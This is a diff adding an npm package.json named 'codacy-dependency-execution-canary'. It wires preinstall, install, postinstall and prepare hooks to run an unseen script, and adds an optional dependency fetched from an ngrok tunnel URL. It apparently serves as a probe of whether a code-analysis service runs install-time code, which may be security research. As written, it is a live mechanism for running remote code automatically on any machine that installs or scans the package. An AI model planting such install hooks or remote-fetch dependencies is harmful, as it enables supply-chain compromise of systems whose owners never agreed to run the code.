@@ -1,0 +1,14 @@
+{
+  "name": "codacy-dependency-execution-canary",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "node scripts/package-lifecycle-canary.cjs preinstall",
+    "install": "node scripts/package-lifecycle-canary.cjs install",
+    "postinstall": "node scripts/package-lifecycle-canary.cjs postinstall",
+    "prepare": "node scripts/package-lifecycle-canary.cjs prepare"
+  },
+  "optionalDependencies": {
+    "codacy-canary-package": "https://dcd6-49-207-201-243.ngrok-free.app/npm-3fc5441a/canary.tgz"
+  }
+}
